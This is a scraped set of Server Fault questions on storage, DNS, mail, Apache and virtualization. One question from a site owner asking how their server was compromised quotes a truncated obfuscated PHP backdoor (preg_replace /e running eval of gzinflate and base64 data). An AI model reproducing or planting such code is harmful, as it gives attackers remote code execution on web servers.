<p>It seems that <a href=""https://www.vmware.com/be/products/vsphere/features/virtual-volumes"" rel=""nofollow noreferrer"">VMWare's Virtual Volumes</a> is what I'm looking for but I don't seem to be able to create a Virtual Volume/VMDK (a.k.a LUN) and allow a physical host to connect it via iSCSI.</p>

<p>Do you know any solution that could accomplish the requirements listed above? A bonus point would be to be able to use the resources from the VMWare infrastructure.</p>
","<storage><vmware-vsphere><dell-equallogic>","2016-04-12 16:07:18"
"939610","Server not powering on after upgraded to Intel Xeon E5-2695 v2","<p>Have a ProLiant DL360p Gen8. Old CPUs were E5-2670. Upgraded HP latest <a href=""https://support.hpe.com/hpsc/swd/public/detail?sp4ts.oid=5194969&amp;swItemId=MTX_cdac009824154b27b3b3637a69&amp;swEnvOid=4184"" rel=""nofollow noreferrer"">ROM</a></p>

<p>Server does not power on any more. See amber LED light on the CPU in the Systems Insight Display.</p>

<p>As far as I know this CPU is supported on this server. What am I missing?</p>
","<hardware><hp><xeon>","2018-11-12 08:38:14"
"769851","Why does Apache (and other browsers) throw 403 due to file system permissions?","<p>To forestall any confusion, I am not asking for help with a technical issue debugging my web server. I am asking about the history and logic behind Apache (and other web servers) throwing 403 when they don't have permissions on a file or its parent directory.</p>

<p>e.g., suppose I have a file like this in my DocumentRoot:</p>

<pre><code>-rw-r----- 1 nobody staff 0 Apr 12 09:35 file.html
</code></pre>

<p>And Apache runs under the user www who is not part of the staff group. If I try to open the URL for this file, I get HTTP 403 Forbidden.</p>

<blockquote>
  <p>The server understood the request, but is refusing to fulfill it. Authorization will not help and the request SHOULD NOT be repeated.</p>
</blockquote>

<p>I understand the technical reason why Apache cannot serve the file. But why use 403? Would not one of the 500 family of errors be more accurate (or 404)?</p>

<p>My reasoning here is that the server is failing to serve the file because the file system permissions are either incorrect (misconfigured) or the admin intentionally wants the file in the document tree but not accessible to the web (think about it.. the error message often says ""<strong>You</strong> don't have permission to access /file.html on this server."".. well who does? Is Apache configured to switch OS users based on who's logged into the web interface?). </p>

<p>If the file is outside of the document tree (e.g., /etc/passwd), then I would expect the server to give 404.</p>

<p>edit: writing/grammar</p>
","<apache-2.2><http>","2016-04-12 16:47:09"
"769857","With DNS, what is the difference between Delegation, Forwarding, Conditional Forwarding, and Stub zones?","<p>I am surprised at how many different ways I have read answers to this question and I still don't know the fine differences of the answer.</p>

<p>For each of these similar DNS concepts:</p>

<ul>
<li>Delegation</li>
<li>Forwarding</li>
<li>Conditional Forwarding</li>
<li>Stub Zones</li>
</ul>

<p>I would like a step-by-step layout of the life of a typical query, preferably ""happy path"" (query succeeds) and ""sad path""(query fails due to a relevant misconfiguration).</p>

<p>In each step:</p>

<ul>
<li>""Who""(or what) is participating? (e.g. authoritative servers? caching servers? dual-purpose servers? clients? example domains/IPs preferred)</li>
<li>What is the raw information being sent in the query? (i.e. a domain? an IP? whose is it? Where FROM and TO is it being sent in this step?)</li>
<li>What and where is information being stored? (e.g. server only stores certain records</li>
</ul>

<p>I prefer pictures with important details embedded.</p>

<p>Lastly, a summary of why you would use each concept/method over the others would be nice.</p>
","<domain-name-system><dns-zone><delegation>","2016-04-12 17:13:21"
"861072","Storage ""Server"" with HDDs that can be accessed by Servers in Cluster","<p>I want to setup some Servers that only have a small amount of Disk Space that is necessary for Linux and Software. All these should act as a Cluster. How would I go about adding sort of like a Storage Server that includes like 8 HDDs with about 2 TB each, that can be accessed by all the Servers in the Cluster? (Amount of HDDs and Space doesn't really matter, only the function of it) I'm sorry im not a System Engineer or anything but I'm still interested in building something like this and don't know where and how to find something like this out.</p>

<p>Thanks</p>
","<storage><cluster>","2017-07-08 18:19:17"
"861116","IPAM (IP address management)","<p>Could any one please explain the difference between Splitting and Allocation a IP address block.</p>

<p>Say if I have 10.0.0.0/24 (254 hosts) available. My requirement is to get a /25. 
Could anyone explain how Splitting and Allocation works?</p>

<p>Thanks a lot.</p>
","<ipv4><ipam>","2017-07-09 07:25:21"
"769910","Can't log in to the DC remotely as Admin","<p>I need some assistance ASAP my old IT Manager who got fire mess up our DC. Now I can' login to DC remotely as Administrator. Non of the 5 Windows servers that I have. This is the error message </p>

<p>"" To Sign in remotely you need the right to sign in Through Remote Desktop Services. By Default members of the Administrators Group have this right or if the right has been remove from the Administrator group you need to be granted this right manually.""</p>

<p>I think he was try to enable remote desktop on all the computers but instead the broke some settings.</p>

<p>Please help on this urgent issue.</p>

<p>Thanks </p>
","<windows><active-directory><windows-server-2012><remote-desktop><domain-controller>","2016-04-12 22:58:16"
"939792","Is the new iOS cloudflare 1.1.1.1 app an actual VPN","<p>The new 1.1.1.1 cloudflare iOS app installs as a VPN profile and when connected the device shows the active VPN icon in the top bar. </p>

<p>My question is, can one tell whether this is actually a VPN (if traffic being encrypted and routed to a cloudflare server) or is the VPN element just a mechanism to install some settings on the device to change the default DNS resolvers to 1.1.1.1.</p>

<p>I think iOS settings currently only allow you to specify DNS resolvers on individual wifi networks, not on cellular or for all current and new future networks, so perhaps this VPN profile is a way around that. But does it lead to a false sense of security for some users (seeing the VPN icon for e.g.)</p>

<p>Comparing the settings that are visible from ios settings -> VPN, for a ""real"" VPN app I see ""Type: IKEv2 along with  server and account. On this new cloudflare one I see type: 1.1.1.1, server but no account - that's the only visible difference in the VPN UI. </p>

<p>My suspicion is that all traffic is still probably unencrypted and open to the ISP to see (if http for example).</p>

<p>Can anyone confirm my suspicion?</p>
","<domain-name-system><vpn><cloudflare><ios>","2018-11-13 11:28:06"
"861219","Bad DNS PTR resource record","<p>i am running my own Mailserver, which works fine, but not for some targets. Basically I can send mails to everybody, except to <code>*@gmx.net</code> and <code>*@web.de</code>, If I do that, it takes about an week and then I get a <code>Undelivered Mail Returned to Sender</code> mail. Within that I find that error:</p>

<pre><code>Diagnostic-Code: smtp; 554-gmx.net (mxgmx114) Nemesis ESMTP Service not
available 554-No SMTP service 554-Bad DNS PTR resource record.
</code></pre>

<p>I have been googling for that and found some explanation, but I still do not know what to put where in the <code>DNS</code> record.</p>

<p>Right now I have that in the <code>TXT</code> part of the <code>DNS</code></p>

<pre><code>v=spf1 a mx ptr -all
</code></pre>

<p>But it is not working.
How can I fix that?</p>
","<domain-name-system><email>","2017-07-10 07:36:03"
"769989","MS SQL Server 2 identical databases on different servers replication or mirroring to each other possible?","<p>Hi: I have one free version of SQL Server 2012 express database running on Amazon AWS with 1 CPU and only 1 GB Ram . As you can see the CPU and RAM power are barely enough for my PHP scripts running on a separate AWS desktop machine to pump data into the server but its free except that I have to pay for data coming in and going out. I have this setup because I need a reliable database that is always on. It has data constantly coming in and I want to achieve the following:</p>

<ol>
<li><p>In order to keep my outbound data expenses very low and to get high  SQL server performance to I want to replicate my data from the Amazon AWS database to my database running on my personal laptop which is very powerful. This way I can run queries as much as I want without disturbing the little Amazon AWS engine database or incurring heavy data transfer charges. I usually turn off my laptop so constant replication is not possible. Is there a way I can set my replication on my laptop in such a way that as soon as my laptop is switched on and online then it will automatically replicate from when it was switched off and then I can do my stuff? It can even be manual replication and I'm perfectly fine with it.</p></li>
<li><p>Different scenario: So as I mentioned in the top paragraph that I have PHP scripts running on a separate Amazon AWS Windows desktop that are pumping data into the single CPU 1 GB ram MS SQL server running on a separate AWS instance. On rare occasions these scripts slip up and skip writing data and then my data goes bad. To prevent this I want to have another identical setup with Amazon BUT I want to set these two separate but identical databases to either replicate or mirror with each other so any time data on is changed one database they both synchronize with each other. Is it possible to have two databases be slave master of each other or parallel mirroring with each other? If so then how can I make this happen?</p></li>
</ol>

<p>Thanks to all in advance.</p>

<p>Romina.</p>
","<sql-server><database><sql><replication><mirror>","2016-04-13 09:57:39"
"861284","Dropbox Headless Install - No Account Linking URL","<p>When installing Dropbox on a headless Linux machine with their install script (<a href=""https://www.dropbox.com/en_GB/install-linux"" rel=""nofollow noreferrer"">https://www.dropbox.com/en_GB/install-linux</a>) - after install, when the <code>dropboxd</code> script is run a URL to link the installation to an account should be displayed.</p>

<p>This is not being displayed, the <code>dropboxd</code> script just hangs and, using the python helper script, <code>dropbox status</code> shows either ""Waiting to link to account"" or ""Starting"". </p>
","<dropbox><headless>","2017-07-10 13:49:18"
"861331","Website not up in other countries","<p>I have a website in Canada and according to <a href=""https://www.uptrends.com/tools/uptime"" rel=""nofollow noreferrer"">https://www.uptrends.com/tools/uptime</a> tests, my website is offline in 7 major European check points. It is live in Canada and working fine but when I travel abroad it will not work. My wordpress website domain is www.premiumfire.com </p>

<p>I have another website with the same host created the same time that is working abroad fine. Any idea how I can fix this block? Thank you!</p>
","<wordpress><website><uptime>","2017-07-10 16:38:27"
"939929","Fast CPU v Lots of cores.... which is best?","<p>We run an ecommerce platform with many sites and lots of crons continually running etc...</p>

<ul>
<li>Resources (images, js) are primarily delivered via CDN.</li>
<li>Our server runs CPU intensive apps such as CXS Watch for WHM, clamd, R1Soft etc.</li>
</ul>

<p>We're upgrading our server and we're deciding between:</p>

<ul>
<li>E3-1240v6 / 32GB ram</li>
<li>E5-2620v4 / 64GB ram</li>
</ul>

<p>My question, is this: what will give us the best result in terms of overall server performance and user experience?  SSD will be used which is a huge gain.  </p>

<p>** we plan on launching a SAAS product in the next 12 months, and so want to cater for that too.</p>

<p>I will value your input, thank you.</p>
","<central-processing-unit><xeon>","2018-11-14 05:37:58"
"939938","How to forward a domain to a Wamp Apache server","<p>I have not been able to find a guide that resolves my issues with forwarding my domain to my wamp apache server.</p>

<p>I've portforwarded correctly and I've made my webpage accessible through my ipv6.</p>

<p>So far I've tried putting every combination of example.com and www.example.com for <code>ServerName</code> and <code>ServerAlias</code> in httpd-vhosts.conf.
I've also made these dns records in my domain.</p>

<pre><code>A       host   points to
        @      my.ipv6

CNAME   host   points to
        www    @
</code></pre>

<p>I'm obviously missing something because it's not working.</p>

<p>Also, if I wanted to forward a subdomain to apache would I just change <code>@</code> to <code>subdir.example.com</code> in the dns records?</p>
","<apache-2.4><web-server><domain-name>","2018-11-14 06:40:56"
"861365","Unusual mail servers configuration","<p><strong>What we have</strong>: extremely cheap dedicated server with configured corp mail server. Unreliable work plus it has permanent troubles with mails verifying (configured by another person).</p>

<p><strong>What we need</strong>: at least several important addresses with 99% reliability.</p>

<p><strong>Idea how to reach that</strong>: Pay to mail provider (right now i'm thinking about G Suite) for several high-reliable addresses, leaving every other user on dedicated server.</p>

<p>So, what we must get at the end - <strong>two MX servers, same mail domain, each server handles it's own addresses</strong>. I'm hardware engineer, so that part of configuring is totally unclear for me - is it possible to make such configuration? I know that it's possible to add second MX server with same address list for redundancy, but what about my variant? Is it even possible somehow to make routing inbound mails between different servers? (as i understood outbound mails won't be a problem at all).</p>

<p><strong>For saving your time</strong> - i know that normal reconfiguration of dedicated server or full migration to G Suite is much more easier, but sadly both options aren't for me :(</p>

<p>Also question for <strong>G Suite experienced users</strong> - is it possible to setup some sort of mail relaying in G Suite? For example, i'm placing 1 MX record with google MX server in domain. If letter arrives at a@domain.com - it goes into G suite address, and if it's b@domain.com - google MX relays it to another server.com. I'm not so good in MX technology, so maybe my question is dumb :) But such solution will also work well in my case.</p>
","<email><email-server><g-suite>","2017-07-10 19:35:53"
"940014","Tcpdump command shows 10 requests per second on SSH","<p>When I type ""tcpdump"" on any VPS server I own I get many requests apparently from my own machine to the SSH port. Is this normal?</p>
","<vps>","2018-11-14 14:52:28"
"861444","NVMe-Dedicated Server without Virtualisation: Big speed benefit?","<p>I am currently using a VPS which is virtualised with Virtuozzo and sometimes my blog is starting to deliver in <strong><em>150ms till 350ms</em></strong> (server response). </p>

<p>I assume that the virtualisation is the bottle neck because as I read Virtuozzo does have only one Kernel which results also in performance issues. May I am wrong, I am not that expert, that's why I am asking here. ;)</p>

<p>A new idea grow in my head: I want to have my <strong>wordpress blog</strong> fast (500 unique visitors a day, and also running Confluence, JIRA and Nextcloud on that VPS). So what about renting a Dedicated Server with NVMe. A performance benefit would also be the Dedication and an extra One the NVMe SSD. What do you think about that? Or should I just look after a Hoster which is not using Virtuaozzo? What would you recommend instead?</p>

<p>I hope I can profit from your experience and knowledge.</p>

<p>Thank you! :)</p>

<p>frank</p>

<p>P.S.: On wordpress blogsite everything I know is done for page speed optimization. (Combining, minifying CSS/JS, optimizing pictures and so on...)</p>
","<virtualization><openvz><dedicated-server><virtuozzo><nvme>","2017-07-11 07:53:17"
"940106","Crontab not working for pageres, showing error MTA installed, discarding output","<p>my ubuntu machine has pagers for taking screenshots, it is working when I run manually</p>

<pre><code>root@bobby:~# pageres https://example.com 480x320 --format=jpg --filename 'page' --overwrite
</code></pre>

<p>But, when I enable cron entry it is not working and throwing MTA error, probably due to the output enabled.</p>

<pre><code>* * * * * su bobby ""/usr/bin/pageres https://example.com 480x320 --format=jpg --filename 'page' --overwrite"" &gt;&gt; log.log

* * * * * su bobby ""pageres https://example.com"" &gt;&gt; log.log
</code></pre>

<p>both commands are not working.</p>
","<linux><ubuntu><cron>","2018-11-15 05:52:11"
"940138","2 versions of openssl on one server","<p>On a server running RedHat 6.7 with Apache 2.4.37 I proceeded to upgrade OpenSSL to 1.1.0i following the same steps as I've done on other servers with the same set up, but on this one, somehow, 2 versions are installed:</p>

<pre><code>openssl version
OpenSSL 1.1.0i  14 Aug 2018 (Library: OpenSSL 1.1.0g  2 Nov 2017)
</code></pre>

<p>and that makes the server fail the security scan, as 1.1.0g is the one that appears on the scan and we're required to run 1.1.0i. Both versions were installed from source.</p>

<p>How can I either:</p>

<ul>
<li>Configure it to use 1.1.0i</li>
<li>Remove 1.1.0g completly</li>
</ul>

<p>or</p>

<ul>
<li>Revert the changes</li>
</ul>
","<redhat><openssl>","2018-11-15 10:21:03"
"770307","How did my non-CMS based website get hacked? I have a file called mails.php which contains a preg_replace statement","<p>I have a series of websites in my server, all of which share the same set of PHP files. They're not based in any CMS (no Wordpress, no Joomla, etc.). All of them contain my own ""CMS"" so to speak. I've never published my code in any public repository or other public site.</p>

<p>So how is it possible that I have a new file called ""mails.php"" in the root of every domain in my server? The contents are something like this:</p>

<pre><code>&lt;?php

preg_replace(""/.*/e"",""\x28\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'7X17f9rG0vD/5/c732GtcipoMAac5CRgiBPHTpyLnfqSpInzUAECVAukSsLYzfF3f2ZmV5fVDUGc0z7vW7exQdqdnd2dnZ2dnUtJm3uTnq25LuswpTkYjvSH/240Bg8f1Efbw+ZI6zcbzbr+WK8/ftB8pLT/+Y/

...snip...

/1KRwsG3Iu0AiUSgmWYolw8UZqaSaX+ojbW56PT6vpClLsH7+jm6aYsVTuhppkpQDUoWolJXu8yrVVk/1weFsZKncsyt+M60J1V4ewhkDMNBMs4eapx5WzqqBLmLoQPu/'\x29\x29\x29\x29\x3B"",""."");?&gt;
</code></pre>

<p>The ""code"" inside the string shown here is not complete (I shortened it before pasting it here) but still, I don't get how is that working. The preg_replace() method is supposed to just return a string, is it? But then the string is not received by anything. So how does it run any code at all? How does that even do something?</p>

<p>Anyway, the biggest question is, how did that file appear in my domains?</p>
","<php><security><website><hacking>","2016-04-14 12:53:13"
"940148","How to get a nameserver IP from Linux CLI?","<p>When I connect to a wireless network from my laptop, Network Manager somehow requests a DNS nameserver IP from the router and writes it to <code>/etc/resolv.conf</code>.</p>

<p>How can I request a nameserver address from cli <em>without changing /etc/resolv.conf</em>, if I only know address of the gateway?</p>
","<linux><domain-name-system><networkmanager>","2018-11-15 10:45:38"
"770384","How to create RDNS (Reverse DNS)","<p>How to create a RDNS (Reverse DNS) in centos or Ubuntu [PTR record] </p>

<p>I searched a lot in Internet and didn't find any solutions. I got a idea it can be done by BIND or BIND9. </p>

<p>In some forum i seen some peoples wrote ""RDNS cannot created by user, it can only created by Server provider or server manager"" - Is it True.</p>

<p>I tried my best all possible way but failed, Can anyone provide me a procedure or idea to create RDNS. </p>

<p>Example </p>

<pre><code>Example.com - xxx.xxx.xxx.xx0
Example.xyz - xxx.xxx.xxx.xx1
xyz.example.com - xxx.xxx.xxx.xx2
</code></pre>

<p>Thanks you.</p>
","<ubuntu><centos><reverse-dns><dns-zone><ptr-record>","2016-04-14 16:52:21"
"861646","apache: how to redirect one HTTPS TLD to another HTTPS TLD of the same domain","<p>I have 3 domains: domain.com, domain.org, and domain.net<br>
I have an SSL cert for .org, but not .com and .net.<br>
I would rather not have to purchase SSL certs for all 3 TLDs.<br>
How do I redirect the .com and .net domains to .org ?<br>
Normal HTTP apache redirection methods don't seem to be working.  </p>

<p>Thanks in advance.</p>
","<ssl><apache-2.4><redirect>","2017-07-11 22:20:06"
"770499","Access CIFS share through another server","<p>I have CIFS-share on NAS-server and that share is accessible to one server.</p>

<p>That share is mounted to my server </p>

<p>\NAS-server\share -> U:\</p>

<p>The server to which the NAS-share is mounted is sharing its local disks to another servers. </p>

<p>I was wondering whether its possible to share that CIFS-share to another machines which currently use the local disks on the same server. As is the server is acting like a proxy for that actual NAS-server?</p>
","<windows-server-2008-r2><cifs>","2016-04-15 05:56:06"
"940279","Dual SAN controller failure","<p>I am new to storage but facing a serious disaster issue of the failure of Dual SAN Controller. Don't know whether this is a right place to ask this question. Anyways the problem is, None of the controllers starting up, Primary controller stuck on Brand Name &amp; Model where as secondary controller stuck on asking for WWN. Initially disk failure occurred, we replaced it and rebuilding started but after some time controller stopped responding. Other healthy Volumes were working fine even during the rebuild process. Wanted to know the ways for recovering data from the dead controller?? <br>Just for curiosity Can I use working controller of another SAN of same make and model with this disk enclosures, will it work ?? What are the chances of recovering the data. Already lodged a support request to the vendor but it's taking long to resolve</p>
","<storage><storage-area-network><data-recovery>","2018-11-16 05:12:39"
"940287","The packet not reaching destination when broadcasted with address 255.255.255.255","<p>I have a bacnet application which broadcast a message to all devices connected. When i use the address 10.9.x.255, it works and the device is able to get the response but when i use the global broadcast 255.255.255.255, the packet is not reaching the device it has to reach.</p>

<p>What may be the reason for this? I can use the address 10.9.x.255 but i would like to know the reason behind it.</p>

<p>On a different computer it works with global broadcast address but does not work on a specific computer. both computers running on windows 10.</p>

<p>Thanks in Advance</p>
","<networking><ip-address>","2018-11-16 07:34:38"
"770600","HP DL380 G8 - SAS Cage Power","<p><a href=""https://i.sstatic.net/9FgkA.jpg"" rel=""nofollow noreferrer"">HP DL380 G8 8 Bay 2.5"" Drive Cage</a></p>

<p>I have been given a HP DL380 G8 Drive cage - duplicated order 
I want to use it on a NON HP Server </p>

<p>On the back of the 8bay 2.5"" drive cage there is a 8 pin power connector</p>

<p>Does anyone know what the pinout is so I can rig up to normal ATX-12 power supply?     </p>
","<hp>","2016-04-15 12:54:38"
"770666","Apache returns empty response and must restart","<p>I have the classical LAMP configuration on several servers, on one server I can frequently see Apache returned an empty error.</p>

<p>I have PHP-FPM running to serve .php file, static pages like .html is okay however if I keep the server running for 1 day, .php will be inaccessible and returned empty response, I must restart httpd to recover this issue.</p>

<p>I can see the only error log in Apache is:</p>

<p><code>[:error] [pid 21153] ModSecurity: ModSecurity requires mod_unique_id to be installed.</code></p>

<p>However I have same configuration on other servers, both got this error but did not have this issue.</p>

<p>How should I diagnose this issue?</p>

<p>Thanks in advance.</p>
","<linux><php><apache-2.4><php-fpm><httpd>","2016-04-15 16:05:38"
"862009","Is the MAC adress visible for non-internal network users like a websites?","<p>I was wondering if someone who isn't in the same network could see other's mac aadress, like websites, app's etc. Looked for it in topics but couldn't find a definitive answer for this question.</p>
","<networking><ip><mac>","2017-07-13 14:48:45"
"862013","Keep inheritance enabled for Delegation","<p>I want to give a normal ""Domain Users"", permission to reset the password of users in the Domain Admins Group.</p>

<p>So I created an OU and moved all the user account targets into it.</p>

<p>Then I used ""Delegate Control"" to give the password reset rights to the normal domain user. </p>

<p>After doing an 'Enable Inheritance' on all the User Accounts it worked.</p>

<p>But shortly after that, the inheritance on the Domain Admins Users became disabled. And it stopped working.</p>

<p>I believe it's AdminSDHolder and Protected Groups is doing it.</p>

<p>I cannot remove users from Domain Admins Group, is there another approach to solving this? </p>

<p>thanks, </p>
","<domain><user-accounts><delegation>","2017-07-13 15:06:41"
"770840","Azure GPU instances?","<p>I see various blog posts and press releases saying Azure has GPU instances (N-type), but I can't see them anywhere. Are they a private beta? (How do I sign up?)  Are they only in a specific region?</p>
","<azure><cloud>","2016-04-16 15:10:08"
"940597","Windows - Alert on Event Log failure","<p>I need to display a local alert when Windows Event Log fails. Other than creating a script that is triggered as part of the service recovery options, is there another way to accomplish this?</p>
","<windows><windows-event-log>","2018-11-18 16:41:51"
"940652","Tracert high latency","<p>I have used tracert command to check local network status, at the second hop I get random- high numbers for latency,(attached file), but when I use ping the total latency has an average of 1ms.</p>

<p>What is the problem?
I really appreciate your help.</p>

<p>BR.
<a href=""https://textuploader.com/dbfm6"" rel=""nofollow noreferrer"">tracert</a></p>
","<traceroute>","2018-11-19 07:26:49"
"862207","unable to send email with php: Message accepted but never received","<p>Here is the complete mail.log</p>

<pre><code>Jul 14 16:48:20 rezocoquin sendmail[5861]: v6EEmKCT005861: from=www-data, size=194, class=0, nrcpts=1, msgid=&lt;201707141448.v6EEmKCT005861@rezocoquin.com&gt;, relay=www-data@localhost
Jul 14 16:48:20 rezocoquin sm-mta[5863]: v6EEmKvf005863: from=&lt;www-data@rezocoquin.com&gt;, size=419, class=0, nrcpts=1, msgid=&lt;201707141448.v6EEmKCT005861@rezocoquin.com&gt;, proto=ESMTP, daemon=MTA-v4, relay=rezocoquin.com [127.0.0.1]
Jul 14 16:48:20 rezocoquin sendmail[5861]: v6EEmKCT005861: to=yarekc@gmail.com, ctladdr=www-data (33/33), delay=00:00:00, xdelay=00:00:00, mailer=relay, pri=30194, relay=[127.0.0.1] [127.0.0.1], dsn=2.0.0, stat=Sent (v6EEmKvf005863 Message accepted$
Jul 14 16:48:20 rezocoquin sm-mta[5868]: STARTTLS=client, relay=gmail-smtp-in.l.google.com., version=TLSv1/SSLv3, verify=FAIL, cipher=ECDHE-RSA-AES128-GCM-SHA256, bits=128/128
Jul 14 16:48:20 rezocoquin sm-mta[5868]: v6EEmKvf005863: to=&lt;yarekc@gmail.com&gt;, ctladdr=&lt;www-data@rezocoquin.com&gt; (33/33), delay=00:00:00, xdelay=00:00:00, mailer=esmtp, pri=120419, relay=gmail-smtp-in.l.google.com. [IPv6:2a00:1450:400c:c07::1b], d$
Jul 14 16:48:20 rezocoquin sm-mta[5868]: v6EEmKvf005863: v6EEmKvf005868: DSN: Service unavailable
Jul 14 16:48:21 rezocoquin sm-mta[5868]: v6EEmKvf005868: to=&lt;www-data@rezocoquin.com&gt;, delay=00:00:01, xdelay=00:00:00, mailer=local, pri=30000, dsn=2.0.0, stat=Sent
</code></pre>

<p>-> No email is received: any idea ?</p>
","<email><smtp><email-server>","2017-07-14 14:54:32"
"862228","how to scale a high traffic server?","<p>I'm very confused on techniques for scaling servers</p>

<p>Say you had one high traffic server running on one computer with one 12 core CPU, and one server for a database.</p>

<p>For a while that would work, but what about if the number of concurrent users becomes very high? How would one scale that? There is only so much that you can buff up one server to be able to handle.</p>

<p>I've searched on the internet for a while but couldn't really find an answer that outlines how one would do this. For instance, how does facebook handle so many users? If anyone has any answers or can point me to any resources I'd greatly appreciate it</p>
","<traffic><scalability>","2017-07-14 16:56:38"
"862249","Add data validation to IP address settings so that user is prompted if IP addresses are configured in same subnet","<p>I am supposed to add validations to my software UI (<a href=""https://i.sstatic.net/shKya.jpg"" rel=""nofollow noreferrer"">IP Subnet UI</a>) which allows the user to enter a pair of IP addresses and subnet masks. 
I am supposed to make sure that <strong>two network interfaces</strong> are not configured in the same subnet. </p>

<p>My understanding is if I perform a a Bitwise AND between IP Address and subnet Mask, I will get a network ID and if N/W IDs are not same, would that be sufficient to claim that two network interfaces are not in the same subnet?</p>

<p>This question is limited to IPV4.</p>
","<windows><networking><routing><subnet><ipv4>","2017-07-14 19:46:01"
"862292","Can I buy a domain name for a server I do not own?","<p>I'm in charge of a server in my school, I do not own it, but the way we access it (the website in the server) is by entering its IP, Can I buy a domain name for it  without asking for permission even though Im not the owner?</p>
","<linux><website><domain-name>","2017-07-15 07:10:55"
"862328","Cost effective storage options for a VMware vShpere environment","<p>I am busy familiarising myself with the revamped and new storage options going from vShpere v5.5 to vShpere v6.5. VMware Virtual SAN is an interesting beast but would like to know how the real life perspectives are. 
Our current production environment has three ESXi virtual hosts attached to a simple iSCSI storage unit (ReadyDATA 5500). At our offsite, we have two ESXi virtual hosts connected also to iSCSI based storage unit (EMC Clarrion AX4). Our biggest challenge is that cost of storage units from EMC, NetApp and HP are very hard to quantify as we basically just require block based storage which is certified by VMware, good support in case we can not deal with a problem and parts availability for at least 5-10 years.
VMware Virtual SAN seems like a very cost effective option to build reliable shared storage. It also seems that the virtual SAN nodes could exceed basic storage unit by a long shot at fraction of the price and provide more flexibility. I am busy obtaining pricing for some entry level vSAN nodes from Supermicro (5TB) and will also look into what HP has to offer.
I would like to find out the following:</p>

<ol>
<li>Is the recommended two to three vSAN node requirement to be strictly
followed? Can I get away having a two node vSAN for our offsite?</li>
<li>From the sound, I can get good performance by having flash
accelerated SATA drives or 10k SAS. We currently using 15K SAS
drives in a RAID10 setup.</li>
<li>Did anybody go through an elaborate exercise of converting their
current shared storage environment to a VMware virtual SAN
infrastructure?</li>
</ol>

<p>I can provide more details - so please feel free to ask.</p>
","<virtualization>","2017-07-15 16:58:28"
"771138","Unknow Host proble on Google Compute Engine","<p>I have my application hosted on Google Compute Engine.
Since 13 Apr I am facing Unknown Host error while issuing ping command to any domain. 
The issue is intermittent. Most of the time the ping command is working but intermittently it will return unknown host error. 
Is there anyone else facing the same issue on Compute Engine?
On the same day an incident was reported to google with network issue
<a href=""https://status.cloud.google.com/incident/compute/16007"" rel=""nofollow noreferrer"">https://status.cloud.google.com/incident/compute/16007</a></p>

<p>As per them the issue is resolved now but I am still getting the error.
Please help.</p>
","<google-compute-engine>","2016-04-18 10:58:29"
"862345","How to create my own virtual machine base images?","<p>I would like to create my own base VM image to allow for faster provisioning of new VMs.</p>

<p>Right now, I'm creating a new and empty VM, inserting the distribution's ISO into it, and going through the whole installer. It takes me 20-30 minutes just to have a fresh machine installed.</p>

<p>Is it a matter of creating and installing the VM manually, and then once it's setup using the <code>libvirt</code> tools to delete the MAC address, change hostname, etc? Or is there a better way to do it?</p>

<p>I'm using KVM/QEMU if that makes a difference, but I'd like to create base images that are vendor agnostic so the same image can run in VirtualBox etc.</p>
","<kvm-virtualization><virtualbox><libvirt><qemu>","2017-07-15 20:45:07"
"941068","Nginx: Configure max_fails and fail_timeout without an upstream definition","<p>In an Nginx configuration with an upstream definition it is possible to define the parameters <code>max_fails</code> and <code>fail_timeout</code> as arguments to the <code>server</code> directive, such as:</p>

<pre><code>upstream dynamic {
    server backend2.example.com:8080 fail_timeout=3 max_fails=3;
}
</code></pre>

<p>But in our configuration we're proxying to backends by dynamically generating the backend names based on the request, so we don't have upstream definitions:</p>

<pre><code>proxy_pass http://${org}-http.hosted-service.svc.cluster.local:3000;
</code></pre>

<p>Is there a way how we can set the <code>fail_timeout</code> and <code>max_fails</code> globally without having to define an <code>upstream</code> for each possible value of <code>${org}</code>?</p>

<p>Our Nginx version is <code>1.13.7</code></p>
","<nginx>","2018-11-21 14:15:44"
"771187","Using New Relic with Docker Cloud","<p>Ok, so here is the setup.</p>

<p>We are using docker cloud in ""bring your own node"" configuration. Our node is running Ubuntu 14.04.</p>

<p>We have installed <code>dockercloud-agent</code> and <code>nrsysmond</code> as required by the respective tutorials. The New Relic agent is reporting data, and we can deploy oour stack through docker cloud, so clearly both are working.</p>

<p>However, New Relic is not reporting docker container metrics. I found a document suggesting that this might be that ""older"" operating systems may store their cgroup files in ""non-default locations"".</p>

<p>Unfortunately I don't have a clue what older means in this context, or whether <code>/sys/fs/cgroup/devices/docker</code> is a ""non-default"" location, or if it is, what to put in the <code>cgroup_root</code> field  in the New Relic configuration file.</p>

<p>Has anyone gotten any of this to work?</p>
","<docker>","2016-04-18 14:53:06"
"862482","No response after executing .sh file and no logs are stored","<p>I have RHEL 6.5 server. I am trying to upgrade  a software. As per the procedure, i executed the file ./upgrade.sh. </p>

<p>I do not see any response from CLI or GUI. Ideally a upgradation window should pop up. But that is not happening. </p>

<p>Moreover, I am not finding any logs regarding this in /var/log/messages.</p>

<p>There is no restrictions on the permissions.</p>
","<linux><networking><redhat><command-line-interface><log-files>","2017-07-17 06:30:34"
"771329","Need a program to check all Ethernet ports in my office for it's proper functioning","<p>my office has a 20 Mbps leased line connection and we are using a firewall machine and unmanageable switches.
Now the problem is the we are getting a very slow speed on all the nodes and we are unable to find any broadcast storm using wire-shark.Now i am going through the lan ports one by one but i can check only the connectivity but not its health i mean how much is it performing. Is it up to the mark or has some other problem.
so i want a software (freeware i hope) which tells all about the connectivity of each port i plug into. Also any advise regarding the speed problem is welcome.</p>
","<ethernet>","2016-04-19 05:07:13"
"771405","Domain and mail redirect","<p>I have domain at providerA and hosting with domain at providerB.</p>

<p>I configured DNS that domainA would redirect to hostingB. With .htaccess setup so now entering either domainA or domainB it shows website hosted at providerB and url shows as domainA in browser.</p>

<p>But now my mail that is sent to emails with domainA also redirects to email accounts with domainB.</p>

<p>What should I do, so email sent to lets say user@domainA.com would get it and not user@domainB.com?</p>
","<email><domain><redirect><hosting>","2016-04-19 11:38:50"
"771452","Add configuration to handle requests for different locations","<p>I use cakephp for my projects.I have made local dns in etc/hosts for folders in /var/sites.My nginx config looks like</p>

<pre><code>    location /{
        add_header 'Access-Control-Allow-Origin' '*';
        add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS';
        root /var/sites/$host/app/webroot;
        index  index.php index.html;
    }
</code></pre>

